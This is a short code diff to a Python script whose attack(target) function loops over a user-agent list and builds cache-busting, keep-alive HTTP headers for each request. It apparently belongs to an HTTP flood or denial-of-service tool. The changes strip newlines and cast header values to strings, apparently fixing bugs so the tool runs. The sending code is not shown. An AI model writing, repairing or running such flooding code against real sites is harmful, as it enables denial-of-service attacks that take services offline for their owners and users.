@@ -6,14 +6,14 @@ import sys
 
 def attack(target):
     count = 0
-    user_agents = open("list/useragents.txt", "r").readlines()
+    user_agents = [line.strip("\n") for line in open("list/useragents.txt", "r", encoding="utf-8").readlines()]
     for ua in user_agents:
         count += 1
         headers = {
-            "User-Agent": ua,
+            "User-Agent": str(ua),
             "Cache-Control": "no-cache",
             "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
-            "Keep-Alive": random.randint(110, 160),
+            "Keep-Alive": str(random.randint(110, 160)),
             "Connection": "keep-alive",
         }
         try: 
